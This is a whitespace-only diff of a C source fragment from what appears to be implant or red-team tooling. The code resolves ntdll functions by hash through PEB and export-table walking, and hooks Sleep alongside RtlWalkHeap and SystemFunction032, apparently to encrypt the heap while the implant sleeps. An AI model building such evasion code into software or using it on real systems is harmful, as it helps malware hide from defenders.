@@ -4,19 +4,19 @@ typedef struct {
     D_API( NtDelayExecution );
     D_API( RtlInitUnicodeString );
     D_API( LdrLoadDll );
-	D_API( LdrUnloadDll );
+    D_API( LdrUnloadDll );
     D_API( RtlWalkHeap );
     D_API( RtlRandomEx );
     D_API( SystemFunction032 );
 } API, *PAPI ;
 
-#define H_LIB_NTDLL				        0x1edab0ed 
-#define H_API_NTDELAYEXECUTION	        0xf5a936aa
-#define H_API_LDRLOADDLL		        0x9e456a43
-#define H_API_LDRUNLOADDLL			    0xd995c1e6
-#define H_API_RTLINITUNICODESTRING	    0xef52b589
+#define H_LIB_NTDLL                     0x1edab0ed 
+#define H_API_NTDELAYEXECUTION          0xf5a936aa
+#define H_API_LDRLOADDLL                0x9e456a43
+#define H_API_LDRUNLOADDLL              0xd995c1e6
+#define H_API_RTLINITUNICODESTRING      0xef52b589
 #define H_API_RTLWALKHEAP               0x182bae64
-#define H_API_RTLRANDOMEX			    0x7f1224f5
+#define H_API_RTLRANDOMEX               0x7f1224f5
 #define H_API_SYSTEMFUNCTION032         0xe58c8805
 
 
@@ -65,7 +65,7 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD dwMilliseconds )
     Api.RtlWalkHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLWALKHEAP );
     Api.RtlRandomEx           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLRANDOMEX );
     Api.RtlInitUnicodeString  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
-	Api.LdrLoadDll            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
+    Api.LdrLoadDll            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
     Api.LdrUnloadDll          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
     
     seed = 1337;
